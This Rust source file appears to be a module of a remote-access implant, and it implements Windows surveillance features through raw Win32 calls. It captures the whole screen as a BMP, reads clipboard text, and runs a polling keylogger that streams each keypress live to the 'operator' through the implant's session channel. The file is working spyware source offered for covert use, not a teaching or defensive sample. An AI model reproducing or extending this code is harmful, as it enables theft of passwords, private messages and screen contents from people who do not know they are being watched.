//! The Windows extras: the screen, the clipboard and the keyboard.
//!
//! Everything here is plain Win32 through the FFI, so the implant does not
//! take a dependency for it.  The calls are the ones the platform
//! documents, and the module only exists on Windows: every other platform
//! answers "that is a Windows capability".
//!
//! The screen is captured as a BMP: the pixels come straight out of GDI, and
//! the console turns the file into a PNG when it saves it.

use crate::task::Outcome;

#[cfg(windows)]
mod sys {
    use std::os::raw::{c_int, c_void};

    pub type HDC = *mut c_void;
    pub type HGDIOBJ = *mut c_void;
    pub type HBITMAP = *mut c_void;
    pub type HWND = *mut c_void;
    pub type BOOL = i32;
    pub type UINT = u32;
    pub type WORD = u16;
    pub type DWORD = u32;
    pub type LONG = i32;

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct BITMAPINFOHEADER {
        pub biSize: DWORD,
        pub biWidth: LONG,
        pub biHeight: LONG,
        pub biPlanes: WORD,
        pub biBitCount: WORD,
        pub biCompression: DWORD,
        pub biSizeImage: DWORD,
        pub biXPelsPerMeter: LONG,
        pub biYPelsPerMeter: LONG,
        pub biClrUsed: DWORD,
        pub biClrImportant: DWORD,
    }

    #[repr(C)]
    pub struct BITMAPINFO {
        pub bmiHeader: BITMAPINFOHEADER,
        pub bmiColors: [u32; 3],
    }

    #[link(name = "gdi32")]
    extern "system" {
        pub fn GetDC(hwnd: HWND) -> HDC;
        pub fn ReleaseDC(hwnd: HWND, hdc: HDC) -> c_int;
        pub fn CreateCompatibleDC(hdc: HDC) -> HDC;
        pub fn DeleteDC(hdc: HDC) -> BOOL;
        pub fn CreateCompatibleBitmap(hdc: HDC, cx: c_int, cy: c_int) -> HBITMAP;
        pub fn SelectObject(hdc: HDC, obj: HGDIOBJ) -> HGDIOBJ;
        pub fn DeleteObject(obj: HGDIOBJ) -> BOOL;
        pub fn BitBlt(
            hdc: HDC,
            x: c_int,
            y: c_int,
            cx: c_int,
            cy: c_int,
            hdc_src: HDC,
            x1: c_int,
            y1: c_int,
            rop: DWORD,
        ) -> BOOL;
        pub fn GetDIBits(
            hdc: HDC,
            bmp: HBITMAP,
            start: UINT,
            lines: UINT,
            bits: *mut c_void,
            info: *mut BITMAPINFO,
            usage: UINT,
        ) -> c_int;
    }

    #[link(name = "user32")]
    extern "system" {
        pub fn GetSystemMetrics(index: c_int) -> c_int;
        pub fn GetAsyncKeyState(vkey: c_int) -> i16;
        pub fn OpenClipboard(owner: HWND) -> BOOL;
        pub fn CloseClipboard() -> BOOL;
        pub fn GetClipboardData(format: UINT) -> HGDIOBJ;
    }

    #[link(name = "kernel32")]
    extern "system" {
        pub fn GlobalLock(mem: HGDIOBJ) -> *mut c_void;
        pub fn GlobalUnlock(mem: HGDIOBJ) -> BOOL;
    }

    pub const SRCCOPY: DWORD = 0x00CC0020;
    pub const DIB_RGB_COLORS: UINT = 0;
    pub const SM_CXSCREEN: c_int = 0;
    pub const SM_CYSCREEN: c_int = 1;
    pub const CF_UNICODETEXT: UINT = 13;
}

/// The capture of the screen, as a BMP file.
#[cfg(windows)]
pub fn screen() -> Result<Vec<u8>, String> {
    use std::os::raw::c_void;
    unsafe {
        let width = sys::GetSystemMetrics(sys::SM_CXSCREEN);
        let height = sys::GetSystemMetrics(sys::SM_CYSCREEN);
        if width <= 0 || height <= 0 {
            return Err("the screen could not be measured".to_string());
        }
        let screen_dc = sys::GetDC(std::ptr::null_mut());
        if screen_dc.is_null() {
            return Err("no device context".to_string());
        }
        let mem_dc = sys::CreateCompatibleDC(screen_dc);
        if mem_dc.is_null() {
            sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
            return Err("no memory device context".to_string());
        }
        let bitmap = sys::CreateCompatibleBitmap(screen_dc, width, height);
        if bitmap.is_null() {
            sys::DeleteDC(mem_dc);
            sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
            return Err("no bitmap".to_string());
        }
        let old = sys::SelectObject(mem_dc, bitmap as sys::HGDIOBJ);
        sys::BitBlt(
            mem_dc, 0, 0, width, height, screen_dc, 0, 0, sys::SRCCOPY,
        );

        let mut info = sys::BITMAPINFO {
            bmiHeader: sys::BITMAPINFOHEADER {
                biSize: 0,
                biWidth: 0,
                biHeight: 0,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: 0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [0; 3],
        };
        info.bmiHeader.biSize = std::mem::size_of::<sys::BITMAPINFOHEADER>() as u32;
        info.bmiHeader.biWidth = width;
        info.bmiHeader.biHeight = height;
        info.bmiHeader.biPlanes = 1;
        info.bmiHeader.biBitCount = 24;
        info.bmiHeader.biCompression = 0;

        let mut buffer = vec![0u8; (width as usize) * (height as usize) * 3];
        let lines = sys::GetDIBits(
            mem_dc,
            bitmap,
            0,
            height as u32,
            buffer.as_mut_ptr() as *mut c_void,
            &mut info as *mut sys::BITMAPINFO,
            sys::DIB_RGB_COLORS,
        );

        sys::SelectObject(mem_dc, old);
        sys::DeleteObject(bitmap as sys::HGDIOBJ);
        sys::DeleteDC(mem_dc);
        sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
        if lines == 0 {
            return Err("the screen could not be read".to_string());
        }
        Ok(bmp(width, height, &buffer))
    }
}

/// Wrap the raw bits of a capture in a BMP file.
///
/// The capture comes out of GDI bottom-up in BGR, which is exactly what a
/// BMP file stores, so the conversion is a header and nothing else.
#[cfg(windows)]
fn bmp(width: i32, height: i32, bits: &[u8]) -> Vec<u8> {
    let row = ((width as u32) * 3 + 3) & !3;
    let padding = row - (width as u32) * 3;
    let pixel_bytes = row * height as u32;
    let mut out: Vec<u8> = Vec::with_capacity(54 + pixel_bytes as usize);
    out.extend_from_slice(b"BM");
    out.extend_from_slice(&(54u32 + pixel_bytes).to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&54u32.to_le_bytes());
    out.extend_from_slice(&40u32.to_le_bytes());
    out.extend_from_slice(&width.to_le_bytes());
    out.extend_from_slice(&height.to_le_bytes());
    out.extend_from_slice(&1u16.to_le_bytes());
    out.extend_from_slice(&24u16.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&pixel_bytes.to_le_bytes());
    out.extend_from_slice(&2835i32.to_le_bytes());
    out.extend_from_slice(&2835i32.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    // A BMP with a positive height stores its rows bottom-up, and the
    // capture comes out of GDI bottom-up as well, so the rows are copied in
    // the order they arrive.
    for y in 0..height as usize {
        let start = y * row as usize;
        let line = &bits[start..start + (width as usize) * 3];
        out.extend_from_slice(line);
        out.extend(std::iter::repeat(0u8).take(padding as usize));
    }
    out
}

/// The text on the clipboard.
#[cfg(windows)]
pub fn clipboard() -> Result<String, String> {
    unsafe {
        if sys::OpenClipboard(std::ptr::null_mut()) == 0 {
            return Err("the clipboard is locked by another program".to_string());
        }
        let mut text = String::new();
        let handle = sys::GetClipboardData(sys::CF_UNICODETEXT);
        if !handle.is_null() {
            let ptr = sys::GlobalLock(handle);
            if !ptr.is_null() {
                let mut len = 0usize;
                while *((ptr as *const u16).add(len)) != 0 {
                    len += 1;
                }
                let slice = std::slice::from_raw_parts(ptr as *const u16, len);
                text = String::from_utf16_lossy(slice);
                sys::GlobalUnlock(handle);
            }
        }
        sys::CloseClipboard();
        Ok(text)
    }
}

/// The key logger.
///
/// The keys are polled, not hooked: a hook needs a message loop, and a
/// message loop inside a beacon is a lot of machinery for a feature that
/// only has to notice what is typed.  The stream is the same one the
/// sessions use, so the operator sees the keys while they are pressed.
#[cfg(windows)]
pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
    let handle = std::thread::spawn(move || {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(seconds);
        let mut previous = [false; 256];
        while std::time::Instant::now() < deadline {
            for vk in 0x08u16..=0xFEu16 {
                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
                if down && !previous[vk as usize] {
                    let line = format!("{}\n", describe(vk));
                    if tx.send(line.into_bytes()).is_err() {
                        break;
                    }
                }
                previous[vk as usize] = down;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        Ok(Outcome::ok(b"the key logger stopped\n".to_vec()))
    });
    Ok(crate::sessions::Stream::new(rx, handle))
}

/// The name of a virtual key code.
#[cfg(windows)]
fn describe(vk: u16) -> String {
    let named = match vk {
        0x08 => "BACKSPACE",
        0x09 => "TAB",
        0x0D => "ENTER",
        0x1B => "ESC",
        0x20 => "SPACE",
        0x7F => "DELETE",
        0x25 => "LEFT",
        0x26 => "UP",
        0x27 => "RIGHT",
        0x28 => "DOWN",
        0x5B => "LWIN",
        0x5C => "RWIN",
        0xA0..=0xA5 => "LSHIFT/CTRL/ALT",
        _ => "",
    };
    if !named.is_empty() {
        return named.to_string();
    }
    if (0x30..=0x39).contains(&vk) || (0x41..=0x5A).contains(&vk) {
        return char::from_u32(vk as u32)
            .map(|c| c.to_string())
            .unwrap_or_else(|| format!("VK_{vk:02X}"));
    }
    format!("VK_{vk:02X}")
}

/// The screen is a Windows capability.
#[cfg(not(windows))]
pub fn screen() -> Result<Vec<u8>, String> {
    Err("the screen is a Windows capability".to_string())
}

/// The clipboard is a Windows capability.
#[cfg(not(windows))]
pub fn clipboard() -> Result<String, String> {
    Err("the clipboard is a Windows capability".to_string())
}

/// The key logger is a Windows capability.
#[cfg(not(windows))]
pub fn keylog(_seconds: u64) -> Result<crate::sessions::Stream, String> {
    Err("the key logger is a Windows capability".to_string())
}
